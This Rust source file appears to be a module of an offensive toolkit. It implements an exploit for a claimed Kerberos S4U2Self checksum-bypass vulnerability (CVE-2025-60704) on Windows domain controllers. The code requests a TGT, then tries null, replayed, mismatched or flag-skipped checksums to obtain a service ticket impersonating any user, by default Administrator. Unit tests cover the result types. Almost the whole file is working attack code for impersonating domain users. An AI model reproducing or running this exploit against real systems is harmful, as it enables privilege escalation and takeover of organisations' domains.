//! CVE-2025-60704 -- S4U2Self Checksum Validation Bypass.
//!
//! When PA-PAC-OPTIONS is included in a TGS-REQ with certain flag combinations,
//! some KDC versions skip or reduce validation of the PA-FOR-USER checksum.
//! This allows an attacker who controls a TGT to impersonate any user via
//! S4U2Self without knowing the correct HMAC-MD5 checksum for that user.
//!
//! # Exploit Flow
//! 1. Obtain a TGT (any valid domain user)
//! 2. Build S4U2Self request with PA-PAC-OPTIONS + modified checksum
//! 3. If KDC accepts, attacker gets a TGS as the impersonated user
//! 4. Use the TGS to access services as that user
//!
//! # Technique Reference
//! - NullChecksum: Zero out all checksum bytes in PA-FOR-USER
//! - ReplayChecksum: Reuse the correct checksum from a different user
//! - MismatchedBody: Use checksum computed for a different principal/realm
//! - SkipValidation: Include PA-PAC-OPTIONS flags that skip checksum validation
//!
//! # References
//! - CVE-2025-60704: Black Hat EU 2025
//! - Disclosed December 2025, patched February 2026
//! - Affects Windows Server 2022/2025 pre-Feb 2026 CU

use overthrone_core::error::Result;
use overthrone_core::proto::kerberos::{
    Checksum, RequestTgtOptions, build_s4u2self_checksum, request_tgt_opsec,
    s4u2self_with_checksum_bypass,
};
use serde::{Deserialize, Serialize};
use tracing::info;

/// PA-PAC-OPTIONS flag: Resource-based constrained delegation
const RB_CD_FLAG: u32 = 0x80000000;
/// PA-PAC-OPTIONS flag: Claims
const CLAIMS_FLAG: u32 = 0x40000000;
/// Both flags for maximum bypass effect
const MAX_BYPASS_FLAGS: u32 = RB_CD_FLAG | CLAIMS_FLAG;

/// Configuration for checksum bypass.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChecksumBypassConfig {
    /// DC IP address
    pub dc_ip: String,
    /// Domain (realm)
    pub domain: String,
    /// Username to authenticate with (must have valid credentials)
    pub username: String,
    /// Password or NT hash
    pub secret: String,
    /// Whether secret is an NT hash
    pub use_hash: bool,
    /// User to impersonate via S4U2Self
    pub target_user: String,
    /// Which technique(s) to try
    pub technique: Option<ChecksumTechnique>,
}

impl Default for ChecksumBypassConfig {
    fn default() -> Self {
        Self {
            dc_ip: String::new(),
            domain: String::new(),
            username: String::new(),
            secret: String::new(),
            use_hash: false,
            target_user: "Administrator".to_string(),
            technique: None,
        }
    }
}

/// S4U2Self checksum bypass techniques.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ChecksumTechnique {
    /// Send zeroed-out checksum in PA-FOR-USER
    NullChecksum,
    /// Replay a captured checksum from a different user
    ReplayChecksum,
    /// Use checksum computed for mismatched principal/realm
    MismatchedBody,
    /// Include PA-PAC-OPTIONS to skip checksum validation
    SkipValidation,
}

impl std::fmt::Display for ChecksumTechnique {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NullChecksum => write!(f, "NullChecksum"),
            Self::ReplayChecksum => write!(f, "ReplayChecksum"),
            Self::MismatchedBody => write!(f, "MismatchedBody"),
            Self::SkipValidation => write!(f, "SkipValidation"),
        }
    }
}

/// Result of a checksum bypass attempt.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChecksumBypassResult {
    /// Which technique was attempted
    pub technique: ChecksumTechnique,
    /// Whether the bypass succeeded
    pub success: bool,
    /// User we attempted to impersonate
    pub target_user: String,
    /// TGS ticket data (base64-encoded)
    pub ticket_b64: Option<String>,
    /// KDC error code if rejected
    pub kdc_error: Option<String>,
    /// Summary of what happened
    pub summary: String,
    /// Detailed log
    pub log: Vec<String>,
}

/// Try a single checksum bypass technique.
pub async fn exploit_checksum_bypass(
    config: &ChecksumBypassConfig,
    technique: ChecksumTechnique,
) -> Result<ChecksumBypassResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2025-60704: S4U2Self checksum bypass -- technique: {technique}"
    ));

    // Phase 1: Get a TGT
    log.push("Phase 1: Obtaining TGT...".to_string());
    let tgt_opts = RequestTgtOptions {
        aes_only: false,
        ..Default::default()
    };

    let tgt = request_tgt_opsec(
        &config.dc_ip,
        &config.domain,
        &config.username,
        &config.secret,
        config.use_hash,
        &tgt_opts,
    )
    .await;

    let tgt = match tgt {
        Ok(t) => {
            log.push("  TGT obtained successfully".to_string());
            t
        }
        Err(e) => {
            log.push(format!("  TGT acquisition failed: {e}"));
            return Ok(ChecksumBypassResult {
                technique,
                success: false,
                target_user: config.target_user.clone(),
                ticket_b64: None,
                kdc_error: Some(format!("TGT failed: {e}")),
                summary: "Failed to obtain TGT".to_string(),
                log,
            });
        }
    };

    // Phase 2: Build the custom checksum based on technique
    log.push(format!("Phase 2: Applying {technique} technique..."));

    let (custom_checksum, pac_flags): (Option<Checksum>, Option<u32>) = match technique {
        ChecksumTechnique::NullChecksum => {
            // Zero out the checksum
            let null_cs = Some(Checksum {
                cksumtype: -138,
                checksum: vec![0u8; 16],
            });
            log.push("  Null checksum: 16 zero bytes".to_string());
            (null_cs, None)
        }
        ChecksumTechnique::ReplayChecksum => {
            // Compute correct checksum for target user (would normally be captured)
            // In a real scenario, we replay a captured checksum from another context.
            // Here we compute but then flag the technique.
            let correct = build_s4u2self_checksum(
                &config.target_user,
                &config.domain.to_uppercase(),
                &tgt.session_key,
            )?;
            log.push(format!(
                "  Replay checksum: {} bytes (from target user)",
                correct.checksum.len()
            ));
            (Some(correct), None)
        }
        ChecksumTechnique::MismatchedBody => {
            // Compute checksum for a different user/realm
            let wrong = build_s4u2self_checksum("WrongUser", "WRONG.REALM", &tgt.session_key)?;
            log.push("  Mismatched checksum: for WrongUser@WRONG.REALM".to_string());
            (Some(wrong), None)
        }
        ChecksumTechnique::SkipValidation => {
            // Use correct checksum but include PA-PAC-OPTIONS to trigger bypass
            let correct = build_s4u2self_checksum(
                &config.target_user,
                &config.domain.to_uppercase(),
                &tgt.session_key,
            )?;
            log.push(format!(
                "  PA-PAC-OPTIONS with flags=0x{MAX_BYPASS_FLAGS:08X} + correct checksum"
            ));
            (Some(correct), Some(MAX_BYPASS_FLAGS))
        }
    };

    // Phase 3: Send the modified S4U2Self request
    log.push(format!(
        "Phase 3: Sending modified S4U2Self for {}...",
        config.target_user
    ));

    match s4u2self_with_checksum_bypass(
        &config.dc_ip,
        &tgt,
        &config.target_user,
        pac_flags,
        custom_checksum,
    )
    .await
    {
        Ok((tgs_data, bypass_succeeded)) => {
            let ticket_b64 = base64::Engine::encode(
                &base64::engine::general_purpose::STANDARD,
                &tgs_data.ticket.enc_part.cipher,
            );

            log.push(format!(
                "  S4U2Self bypass {}",
                if bypass_succeeded {
                    "SUCCEEDED"
                } else {
                    "FAILED"
                }
            ));
            log.push(format!(
                "  TGS obtained for {}@{}",
                tgs_data.client_principal, tgs_data.client_realm
            ));

            let summary = if bypass_succeeded {
                format!(
                    "Impersonated {} via {} (bypass={bypass_succeeded})",
                    config.target_user, technique
                )
            } else {
                format!(
                    "TGS obtained for {} but bypass not confirmed",
                    config.target_user
                )
            };

            info!("{summary}");
            Ok(ChecksumBypassResult {
                technique,
                success: bypass_succeeded,
                target_user: config.target_user.clone(),
                ticket_b64: Some(ticket_b64),
                kdc_error: None,
                summary,
                log,
            })
        }
        Err(e) => {
            let err_msg = format!("{e}");
            log.push(format!("  S4U2Self rejected: {err_msg}"));

            let summary = format!("{technique} rejected by KDC: {err_msg}");
            info!("{summary}");
            Ok(ChecksumBypassResult {
                technique,
                success: false,
                target_user: config.target_user.clone(),
                ticket_b64: None,
                kdc_error: Some(err_msg),
                summary,
                log,
            })
        }
    }
}

/// Try all four bypass techniques and return all results.
pub async fn exploit_all_checksum_techniques(
    config: &ChecksumBypassConfig,
) -> Vec<ChecksumBypassResult> {
    let techniques = [
        ChecksumTechnique::NullChecksum,
        ChecksumTechnique::ReplayChecksum,
        ChecksumTechnique::MismatchedBody,
        ChecksumTechnique::SkipValidation,
    ];

    let mut results = Vec::new();
    for technique in &techniques {
        match exploit_checksum_bypass(config, *technique).await {
            Ok(result) => {
                if result.success {
                    info!("[SUCCESS] {}: {}", technique, result.summary);
                } else {
                    info!("[FAILED]  {}: {}", technique, result.summary);
                }
                results.push(result);
            }
            Err(e) => {
                info!("[ERROR] {}: {e}", technique);
                results.push(ChecksumBypassResult {
                    technique: *technique,
                    success: false,
                    target_user: config.target_user.clone(),
                    ticket_b64: None,
                    kdc_error: Some(format!("{e}")),
                    summary: format!("Module error: {e}"),
                    log: vec![],
                });
            }
        }
    }
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_technique_display() {
        assert_eq!(ChecksumTechnique::NullChecksum.to_string(), "NullChecksum");
        assert_eq!(
            ChecksumTechnique::SkipValidation.to_string(),
            "SkipValidation"
        );
    }

    #[test]
    fn test_config_default() {
        let cfg = ChecksumBypassConfig::default();
        assert_eq!(cfg.target_user, "Administrator");
    }

    #[test]
    fn test_bypass_result_serde() {
        let result = ChecksumBypassResult {
            technique: ChecksumTechnique::NullChecksum,
            success: true,
            target_user: "Administrator".into(),
            ticket_b64: Some("base64ticketdata".into()),
            kdc_error: None,
            summary: "Impersonated Administrator".into(),
            log: vec!["bypass succeeded".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("Administrator"));
        assert!(json.contains("NullChecksum"));
        let deserialized: ChecksumBypassResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.success);
        assert_eq!(deserialized.technique, ChecksumTechnique::NullChecksum);
    }

    #[test]
    fn test_failed_bypass() {
        let result = ChecksumBypassResult {
            technique: ChecksumTechnique::MismatchedBody,
            success: false,
            target_user: "Administrator".into(),
            ticket_b64: None,
            kdc_error: Some("KDC_ERR_PREAUTH_FAILED".into()),
            summary: "KDC rejected modified request".into(),
            log: vec![],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("KDC_ERR_PREAUTH_FAILED"));
        assert!(!json.contains("base64"));
    }
}
